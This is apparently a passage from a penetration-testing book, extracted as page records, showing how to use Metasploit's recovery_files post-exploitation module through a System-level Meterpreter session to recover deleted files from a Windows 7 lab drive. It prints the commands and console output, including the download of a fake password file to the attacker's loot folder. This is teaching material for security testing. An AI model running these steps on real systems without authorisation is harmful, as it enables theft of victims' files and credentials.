- img_proc: false
  md: 'There are many modules available in Meterpreter. Now that we have System level
    access, let''s take a second and see how to use one of the modules to recover
    files that have been deleted from a remote drive. The "***recovery_files***" script
    allows you to recover files that the target user has deleted from his system.
    This could be very handy, as deleted files could contain information of interest
    for both the forensics and pentesting realm. System files and logs, account information,
    and important documents are just a small sample of what could be recovered.


    To prep for this example, I simply went to my Windows 7 system and created a fake
    "Accounts Passwords.txt" file and saved a copy of Nmap''s "Discovery.pdf" manual
    on a NTFS formatted USB drive connected to the VM as the E: drive.


    I then deleted the files:


    ![](bbox=[0.156, 0.345, 0.752, 0.53])


    # ***Using the Module***


    The module requires that you have an open session to the target that you want
    to check. We will simply use the session that we obtained in the previous section.
    Once we have a successful remote session, we will need to background the active
    session to temporarily back out to the msf prompt and then run the module.


    Enter, "***background***"

    Then, "***use post/windows/gather/forensics/recovery_files***"

    And lastly, "***show options***":


    ![](bbox=[0.135, 0.788, 0.87, 0.984])'
  merge: -1
  pgno: 175
- img_proc: false
  md: 'Now we just need to set the drive and session variables. We will be using Session
    2 for our example as system level access is required to access the deleted files.


    Type, **"set DRIVE E:"**

    Then, **"set SESSION 2"**


    ```

    msf post(windows/gather/forensics/recovery_files) > set DRIVE E:

    DRIVE => E:

    msf post(windows/gather/forensics/recovery_files) > set SESSION 2

    SESSION => 2

    ```


    Finally type, **"run"** to execute the module:


    ```

    msf post(windows/gather/forensics/recovery_files) > run


    [*] System Info - OS: Windows 7 (Build 7600)., Drive: E:

    [*] $MFT is made up of 1 dataruns

    [*] Searching deleted files in data run 1 ...

    [*] Name: DISCOV-1.PDF   ID: 3221262336

    [*] Name: ACCOUN-1.TXT   ID: 3221263360

    [+] MFT entries finished

    [*] Post module execution completed

    ```


    The post module ran, and as you can see above, found both files that were deleted
    from the USB drive attached to the Windows system. Now, say we only wanted to
    recover the txt files.


    Simply type, **"set FILES txt"** and run the exploit again:


    ```

    msf post(windows/gather/forensics/recovery_files) > set FILES txt

    FILES => txt

    msf post(windows/gather/forensics/recovery_files) > run


    [*] System Info - OS: Windows 7 (Build 7600)., Drive: E:

    [*] $MFT is made up of 1 dataruns

    [*] Searching deleted files in data run 1 ...

    [*] Name: DISCOV-1.PDF   ID: 3221262336

    [*] Name: ACCOUN-1.TXT   ID: 3221263360

    [+] Hidden file found!

    [*] File to download: ACCOUN-1.TXT

    [*] The file is resident. Saving ACCOUN-1.TXT ...

    [+] File saved on /root/.msf4/loot/20180531160459_default_192.168.1.93_resident.file_868248.txt

    [+] MFT entries finished

    [*] Post module execution completed

    msf post(windows/gather/forensics/recovery_files) >

    ```


    It recovered the text file and stored it in the ***/root/.msf4/loot*** directory.
    If we surf to that directory we can find and open the file that was saved. It
    is a hidden directory, so if you are using the Kali file browser, you need to
    click the three-line icon on the upper right of the menu, and then click "Show
    Hidden Files".'
